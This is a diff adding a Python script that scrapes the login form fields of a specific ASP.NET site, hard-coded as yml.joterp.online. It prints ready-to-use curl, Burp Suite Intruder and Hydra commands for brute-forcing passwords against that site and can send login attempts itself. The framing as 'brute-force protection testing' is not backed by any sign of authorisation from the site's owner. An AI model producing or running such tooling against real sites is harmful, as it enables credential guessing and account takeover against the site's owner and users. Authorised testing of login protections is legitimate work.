@@ -1,0 +1,360 @@
+#!/usr/bin/env python3
+"""
+ASP.NET Login Form Field Extractor
+Automatically extracts all POST parameters from the login page
+"""
+
+import requests
+from bs4 import BeautifulSoup
+import json
+import sys
+
+def extract_form_fields(url):
+    """Extract all form fields from ASP.NET login page"""
+    
+    print(f"{'='*70}")
+    print(f"ASP.NET LOGIN FORM FIELD EXTRACTOR")
+    print(f"{'='*70}")
+    print(f"\nTarget URL: {url}\n")
+    
+    try:
+        # Create session to maintain cookies
+        session = requests.Session()
+        
+        # Get the login page
+        print("[1] Fetching login page...")
+        response = session.get(url, timeout=10)
+        
+        if response.status_code != 200:
+            print(f"❌ Error: Got status code {response.status_code}")
+            return None
+        
+        print("✓ Page fetched successfully\n")
+        
+        # Parse HTML
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Extract all form fields
+        form_fields = {}
+        
+        # 1. Extract hidden fields (ViewState, etc.)
+        print("[2] Extracting ASP.NET hidden fields:")
+        hidden_fields = soup.find_all('input', {'type': 'hidden'})
+        
+        for field in hidden_fields:
+            name = field.get('name')
+            value = field.get('value', '')
+            if name:
+                form_fields[name] = value
+                # Only show ASP.NET specific fields
+                if name.startswith('__'):
+                    short_value = value[:50] + "..." if len(value) > 50 else value
+                    print(f"   ✓ {name}: {short_value}")
+        
+        # 2. Find username field
+        print("\n[3] Finding username/email field:")
+        username_field = None
+        
+        # Common patterns for username fields
+        text_inputs = soup.find_all('input', {'type': 'text'})
+        for field in text_inputs:
+            name = field.get('name', '').lower()
+            field_id = field.get('id', '').lower()
+            placeholder = field.get('placeholder', '').lower()
+            
+            if any(keyword in name + field_id + placeholder 
+                   for keyword in ['user', 'email', 'login', 'account']):
+                username_field = field.get('name')
+                print(f"   ✓ Found: {username_field}")
+                print(f"     ID: {field.get('id')}")
+                print(f"     Placeholder: {field.get('placeholder', 'N/A')}")
+                form_fields['__USERNAME_FIELD__'] = username_field
+                break
+        
+        if not username_field:
+            print("   ⚠️  No username field found automatically")
+        
+        # 3. Find password field
+        print("\n[4] Finding password field:")
+        password_field = None
+        
+        password_inputs = soup.find_all('input', {'type': 'password'})
+        for field in password_inputs:
+            password_field = field.get('name')
+            print(f"   ✓ Found: {password_field}")
+            print(f"     ID: {field.get('id')}")
+            form_fields['__PASSWORD_FIELD__'] = password_field
+            break
+        
+        if not password_field:
+            print("   ⚠️  No password field found")
+        
+        # 4. Find submit button
+        print("\n[5] Finding submit button:")
+        button_field = None
+        button_value = None
+        
+        # Try input type submit
+        submit_buttons = soup.find_all('input', {'type': 'submit'})
+        if not submit_buttons:
+            # Try button tags
+            submit_buttons = soup.find_all('button', {'type': 'submit'})
+        
+        for button in submit_buttons:
+            button_field = button.get('name')
+            button_value = button.get('value', button.text.strip())
+            if button_field:
+                print(f"   ✓ Found: {button_field}")
+                print(f"     Value: {button_value}")
+                form_fields['__BUTTON_FIELD__'] = button_field
+                form_fields['__BUTTON_VALUE__'] = button_value
+                break
+        
+        if not button_field:
+            print("   ⚠️  No submit button found")
+        
+        # 5. Display complete POST data format
+        print(f"\n{'='*70}")
+        print("COMPLETE POST DATA")
+        print(f"{'='*70}\n")
+        
+        # Show as Python dictionary
+        print("Python Dictionary Format:")
+        print("-" * 70)
+        print("post_data = {")
+        for key, value in form_fields.items():
+            if not key.startswith('__'):
+                if key.startswith('__VIEW') or key.startswith('__EVENT'):
+                    print(f"    '{key}': '{value[:30]}...',  # Extract fresh each time")
+                else:
+                    short_value = value[:30] + "..." if len(value) > 30 else value
+                    print(f"    '{key}': '{short_value}',")
+        
+        if username_field:
+            print(f"    '{username_field}': 'YOUR_USERNAME',")
+        if password_field:
+            print(f"    '{password_field}': 'YOUR_PASSWORD',")
+        if button_field:
+            print(f"    '{button_field}': '{button_value}'")
+        print("}")
+        
+        # Show as URL encoded
+        print("\n" + "-" * 70)
+        print("URL Encoded Format (for curl/Burp):")
+        print("-" * 70)
+        
+        encoded_parts = []
+        for key, value in form_fields.items():
+            if not key.startswith('__'):
+                # URL encode special characters
+                encoded_parts.append(f"{key}={value}")
+        
+        if username_field:
+            encoded_parts.append(f"{username_field}=YOUR_USERNAME")
+        if password_field:
+            encoded_parts.append(f"{password_field}=YOUR_PASSWORD")
+        if button_field:
+            encoded_parts.append(f"{button_field}={button_value}")
+        
+        print("&\n".join(encoded_parts))
+        
+        # Show as cURL command
+        print("\n" + "-" * 70)
+        print("cURL Command:")
+        print("-" * 70)
+        print(f"""
+curl -X POST "{url}" \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -H "User-Agent: Mozilla/5.0" \\
+  -d "__VIEWSTATE=$VIEWSTATE" \\
+  -d "__VIEWSTATEGENERATOR=$GENERATOR" \\
+  -d "__EVENTVALIDATION=$VALIDATION" \\
+  -d "{username_field}=your_username" \\
+  -d "{password_field}=your_password" \\
+  -d "{button_field}={button_value}"
+""")
+        
+        # Show Burp Suite format
+        print("-" * 70)
+        print("Burp Suite Intruder Format:")
+        print("-" * 70)
+        print(f"""
+POST /Account/Login.aspx HTTP/1.1
+Host: yml.joterp.online
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+
+""")
+        burp_parts = []
+        for key, value in form_fields.items():
+            if not key.startswith('__'):
+                if 'VIEWSTATE' in key or 'EVENT' in key:
+                    burp_parts.append(f"{key}=<extract_fresh>")
+                else:
+                    burp_parts.append(f"{key}={value}")
+        
+        if username_field:
+            burp_parts.append(f"{username_field}=testuser")
+        if password_field:
+            burp_parts.append(f"{password_field}=§password§")  # Burp payload marker
+        if button_field:
+            burp_parts.append(f"{button_field}={button_value}")
+        
+        print("&\n".join(burp_parts))
+        
+        # Show Hydra format
+        print("\n" + "-" * 70)
+        print("Hydra Command:")
+        print("-" * 70)
+        
+        # Build Hydra parameters
+        hydra_params = f"{username_field}=^USER^"
+        hydra_params += f"&{password_field}=^PASS^"
+        
+        print(f"""
+hydra -l your_username -P passwords.txt \\
+  yml.joterp.online \\
+  https-post-form "/Account/Login.aspx:{hydra_params}:F=Invalid:H=Content-Type: application/x-www-form-urlencoded"
+
+NOTE: Hydra may have issues with ASP.NET ViewState. 
+      Use Burp Suite for more reliable testing.
+""")
+        
+        # Save to JSON file
+        output_file = "login_form_fields.json"
+        with open(output_file, 'w') as f:
+            json.dump(form_fields, f, indent=2)
+        
+        print(f"\n{'='*70}")
+        print(f"✓ Form fields saved to: {output_file}")
+        print(f"{'='*70}\n")
+        
+        return form_fields
+        
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Network error: {e}")
+        return None
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        import traceback
+        traceback.print_exc()
+        return None
+
+
+def test_login(url, username, password, form_fields):
+    """Test login with extracted fields"""
+    
+    print(f"\n{'='*70}")
+    print("TESTING LOGIN REQUEST")
+    print(f"{'='*70}\n")
+    
+    try:
+        session = requests.Session()
+        
+        # First, get fresh ViewState
+        print("[1] Getting fresh ViewState...")
+        response = session.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Update ViewState fields
+        viewstate_fields = ['__VIEWSTATE', '__VIEWSTATEGENERATOR', '__EVENTVALIDATION']
+        for field_name in viewstate_fields:
+            field = soup.find('input', {'name': field_name})
+            if field:
+                form_fields[field_name] = field.get('value', '')
+                print(f"✓ Updated {field_name}")
+        
+        # Build POST data
+        post_data = {}
+        username_field = form_fields.get('__USERNAME_FIELD__')
+        password_field = form_fields.get('__PASSWORD_FIELD__')
+        button_field = form_fields.get('__BUTTON_FIELD__')
+        button_value = form_fields.get('__BUTTON_VALUE__', '')
+        
+        # Add all hidden fields
+        for key, value in form_fields.items():
+            if not key.startswith('__'):
+                post_data[key] = value
+        
+        # Add credentials
+        if username_field:
+            post_data[username_field] = username
+        if password_field:
+            post_data[password_field] = password
+        if button_field:
+            post_data[button_field] = button_value
+        
+        # Send POST request
+        print(f"\n[2] Sending login request...")
+        print(f"    Username field: {username_field}")
+        print(f"    Password field: {password_field}")
+        print(f"    Button field: {button_field}")
+        
+        response = session.post(url, data=post_data)
+        
+        print(f"\n[3] Response received:")
+        print(f"    Status code: {response.status_code}")
+        print(f"    Response length: {len(response.content)} bytes")
+        print(f"    Redirected: {response.history != []}")
+        
+        # Check for success/failure indicators
+        response_text = response.text.lower()
+        
+        if 'invalid' in response_text or 'incorrect' in response_text:
+            print(f"    Result: ❌ Invalid credentials (expected)")
+        elif 'dashboard' in response_text or 'welcome' in response_text:
+            print(f"    Result: ✓ Login successful!")
+        else:
+            print(f"    Result: ⚠️  Unknown (check response)")
+        
+        # Save response for inspection
+        with open('login_response.html', 'w', encoding='utf-8') as f:
+            f.write(response.text)
+        
+        print(f"\n✓ Response saved to: login_response.html")
+        
+        return response
+        
+    except Exception as e:
+        print(f"❌ Test failed: {e}")
+        return None
+
+
+def main():
+    """Main function"""
+    
+    # Target URL
+    target_url = "https://yml.joterp.online/Account/Login.aspx"
+    
+    # Extract form fields
+    fields = extract_form_fields(target_url)
+    
+    if not fields:
+        print("Failed to extract form fields")
+        sys.exit(1)
+    
+    # Ask if user wants to test
+    print("\nWould you like to test the login request?")
+    print("This will send a test login with dummy credentials.")
+    choice = input("Test login? (y/n): ").strip().lower()
+    
+    if choice == 'y':
+        username = input("Enter test username: ").strip()
+        password = input("Enter test password: ").strip()
+        
+        if username and password:
+            test_login(target_url, username, password, fields)
+    
+    print("\n" + "="*70)
+    print("EXTRACTION COMPLETE!")
+    print("="*70)
+    print("\nNext steps:")
+    print("1. Use the POST data format in Burp Suite Intruder")
+    print("2. Remember to extract fresh ViewState for each request")
+    print("3. Configure your testing tool with the correct field names")
+    print("4. Start your brute-force protection testing")
+    print("="*70 + "\n")
+
+
+if __name__ == "__main__":
+    main()
